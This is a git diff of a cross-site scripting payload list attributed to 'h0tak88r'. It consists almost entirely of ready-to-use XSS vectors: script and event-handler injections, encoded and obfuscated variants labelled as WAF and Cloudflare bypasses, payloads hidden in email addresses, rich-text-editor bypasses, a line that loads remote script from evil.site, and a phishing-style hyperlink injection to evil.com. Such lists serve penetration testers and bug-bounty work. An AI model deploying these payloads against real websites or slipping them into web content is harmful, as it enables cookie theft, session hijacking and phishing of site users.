@@ -1,3 +1,6 @@
+# Payload list by h0tak88r
+```html
+# karem bayloads
 '"><script>alert('karem')</script> 
 '"><img src=1 onerror="alert('Karem')">
 '"><img src=1 onkarem=1 onerror="alert('Karem')"> 
@@ -21,7 +24,8 @@
 "><svg/onload=alert.bind()(document.domain)> 
 '`><\x00img src=xxx:x onerror=javascript:alert(1)> 
 '"><<Svg/Only=1/OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
-"><button%20popovertarget=x>Click%20me</button>%20<input%20type="hidden"%20value="y"%20popover%20id=x%20onbeforetoggle=alert(document.cookie)>
+
+# h0tak88r
 <style>*{background-image:url('\\\\6A\\\\61\\\\76\\\\61\\\\73\\\\63\\\\72\\\\69\\\\70\\\\74\\\\3A\\\\61\\\\6C\\\\65\\\\72\\\\74\\\\28\\\\6C\\\\6F\\\\63\\\\61\\\\74\\\\69\\\\6F\\\\6E\\\\29')}</style>
 %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%58%53%53%22%29%3C%2F%73%63%72%69%70%74%3E
 [̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
@@ -36,6 +40,7 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 toString=\\\\u0061lert;window+' '
 aaaaa<h1 onclick=alert(1)>test
 <noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
+
 
 # Quick Defense:
 <input type="search" onsearch="aler\\\\u0074(1)">
@@ -108,9 +113,22 @@ aaaaa<h1 onclick=alert(1)>test
 
 # Bypass ‘ ‘ ( ) 
 <iframe/src=javascript:alert%26%23x000000028%3b%27hacked%27)>
+
 # waf Bypass SVG
 <svg><a xlink:href=?usemap=/*&#x26;#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;*/onmouseover=window.focus()//>Hover me</a></svg>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
-<textarea/onbeforeinput=kuro=&[#x27](tg://search_hashtag?hashtag=x27);//domain.tld&[#x27](tg://search_hashtag?hashtag=x27);;import(kuro)%09autofocus%09x>
-<div onpointerover="ja&#x76;ascr&#x69;pt:eva&#x6C;(decodeURICompo&#110;ent(String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110, 41)))" style="width:100%;height:100vh;"></div>
-Payload before obfuscation: <div onpointerover="javascript:alert([document.domain](http://document.domain/?trk=public_post-text))" style="width:100%;height:100vh;"></div>
+
+# XSS in email Section
+admin1@example.com<script>alert('xss');</script> 
+“><svg/onload=confirm(1)>”@x.y 
+"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com 
+["');alert('XSS');//"]@xyz.xxx 
+"<svg/onload=alert(1)>"@gmail.com 
+test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E
+
+# XSS Bypass for Rich Text Editors
+<</p>iframe src=javascript:alert()//
+<a href="aaa:bbb">x</a>
+<a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
+[Click on me to claim 100$ vouchers](<https://evil.com>) -> Hyperlink Injection
+```
